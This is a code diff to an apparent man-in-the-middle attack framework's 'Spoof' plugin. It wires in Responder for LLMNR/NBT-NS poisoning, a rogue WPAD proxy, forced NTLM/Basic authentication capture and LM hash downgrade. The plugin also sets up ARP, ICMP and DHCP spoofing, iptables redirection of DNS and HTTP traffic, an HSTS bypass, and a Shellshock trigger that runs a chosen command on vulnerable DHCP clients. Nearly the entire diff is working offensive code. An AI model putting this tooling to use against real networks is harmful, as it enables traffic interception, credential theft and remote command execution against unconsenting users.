@@ -13,6 +13,7 @@ import nfqueue
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
+from libs.responder.Responder import *
 import os
 import sys
 import threading
@@ -39,11 +40,8 @@ class Spoof(Plugin):
         self.interface = options.interface
         self.arp = options.arp
         self.icmp = options.icmp
-        self.wpad = options.wpad
         self.dns = options.dns
-        self.dnscfg = options.dnscfg
         self.dhcp = options.dhcp
-        self.dhcpcfg = options.dhcpcfg 
         self.shellshock = options.shellshock
         self.cmd = options.cmd
         self.gateway = options.gateway
@@ -52,10 +50,11 @@ class Spoof(Plugin):
         self.arpmode = options.arpmode
         self.port = options.listen
         self.hsts = options.hsts
-        self.hstscfg = "./config_files/hsts_bypass.cfg"
         self.manualiptables = options.manualiptables  #added by alexander.georgiev@daloo.de
         self.debug = False
         self.send = True
+        thread_target = None
+        thread_args = None
 
         if os.geteuid() != 0:
             sys.exit("[-] Spoof plugin requires root privileges")
@@ -63,12 +62,16 @@ class Spoof(Plugin):
         if not self.interface:
             sys.exit('[-] Spoof plugin requires --iface argument')
 
+        try:
+            self.ip_address = get_if_addr(options.interface)
+            if self.ip_address == "0.0.0.0":
+                sys.exit("[-] Interface %s does not have an IP address" % self.interface)
+        except Exception, e:
+            sys.exit("[-] Error retrieving interface IP address: %s" % e)
+
+ 
         if self.options.log_level == 'debug':
             self.debug = True
-
-        print "[*] Spoof plugin online"
-        if not self.manualiptables:
-            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
         try:
             self.mac = get_if_hwaddr(self.interface)
@@ -107,23 +110,28 @@ class Spoof(Plugin):
 
             self.rand_number = []
             self.dhcp_dic = {}
-            self.dhcpcfg = ConfigObj(self.dhcpcfg)
+            self.dhcpcfg = ConfigObj("./config/dhcp.cfg")
             thread_target = self.dhcp_sniff
             thread_args = ()
-        else:
-            sys.exit("[-] Spoof plugin requires --arp, --icmp or --dhcp")
+        
+        elif not options.WPAD_On_Off:
+            sys.exit("[-] Spoof plugin requires --arp, --icmp, --dhcp or --wpad")
+
+        print "[*] Spoof plugin online"
+        if not self.manualiptables:
+            os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
         if (self.dns or self.hsts):
             print "[*] DNS Tampering enabled"
             
             if self.dns:
-                self.dnscfg = ConfigObj(self.dnscfg)
+                self.dnscfg = ConfigObj("./config/dns.cfg")
 
-            self.hstscfg = ConfigObj(self.hstscfg)
+            self.hstscfg = ConfigObj("./config/hsts_bypass.cfg")
 
             if not self.manualiptables:
                 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
-            
+
             self.start_dns_queue()
 
         file = open('/proc/sys/net/ipv4/ip_forward', 'w')
@@ -133,13 +141,18 @@ class Spoof(Plugin):
             print '[*] Setting up iptables'
             os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)
 
-        CHarvester = CredHarvester()
-        t1 = threading.Thread(name='spoof_thread', target=thread_target, args=thread_args)
-        t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
+        #CHarvester = CredHarvester()
+        threads = []
+        if thread_target:
+             threads.append(threading.Thread(name='spoof_thread', target=thread_target, args=thread_args))
+             #t2 = threading.Thread(name='cred_harvester', target=CHarvester.start, args=(self.interface))
 
-        for t in [t1, t2]:
-            t.setDaemon(True)
-            t.start()
+        threads.append(threading.Thread(name='responder', target=start_responder, args=(options, self.ip_address)))
+
+        if threads:
+            for t in threads:
+                t.setDaemon(True)
+                t.start()
 
     def dhcp_rand_ip(self):
         pool = self.dhcpcfg['ip_pool'].split('-')
@@ -345,14 +358,22 @@ class Spoof(Plugin):
         options.add_argument('--dns', dest='dns', action='store_true', default=False, help='Modify intercepted DNS queries')
         options.add_argument('--shellshock', dest='shellshock', action='store_true', default=False, help='Trigger the Shellshock vuln when spoofing DHCP')
         options.add_argument('--cmd', type=str, dest='cmd', default="echo 'pwned'", help='Command to run on vulnerable clients [default: echo pwned]')
-        options.add_argument("--dnscfg", type=file, default="./config_files/dns.cfg", help="DNS tampering config file [default: dns.cfg]")
-        options.add_argument("--dhcpcfg", type=file, default="./config_files/dhcp.cfg", help="DHCP spoofing config file [default: dhcp.cfg]")
         options.add_argument('--iface', dest='interface', help='Specify the interface to use')
         options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
         options.add_argument('--target', dest='target', help='Specify a host to poison [default: subnet]')
         options.add_argument('--arpmode', dest='arpmode', default='req', help=' ARP Spoofing mode: requests (req) or replies (rep) [default: req]')
         #options.add_argument('--summary', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
         options.add_argument('--manual-iptables', dest='manualiptables', action='store_true', default=False, help='Do not setup iptables or flush them automatically')
+        #rgroup = options.add_argument_group("Responder", "Options for Responder")
+        options.add_argument('--analyze', dest="Analyse", action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning anything")
+        options.add_argument('--basic', dest="Basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
+        options.add_argument('--wredir', dest="Wredirect", default=False, action="store_true", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' would). Default value is therefore set to False")
+        options.add_argument('--nbtns', dest="NBTNSDomain", default=False, action="store_true", help="Set this to enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network (like a classic 'nbns spoofer' would). Default value is therefore set to False")
+        options.add_argument('--fingerprint', dest="Finger", default=False, action="store_true", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query")
+        options.add_argument('--wpad', dest="WPAD_On_Off", default=False, action="store_true", help = "Set this to start the WPAD rogue proxy server. Default value is False")
+        options.add_argument('--forcewpadauth', dest="Force_WPAD_Auth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
+        options.add_argument('--lm', dest="LM_On_Off", default=False, action="store_true", help="Set this if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False")
+        options.add_argument('--verbose', dest="Verbose", action="store_true", help="More verbose")
 
     def finish(self):
         self.send = False
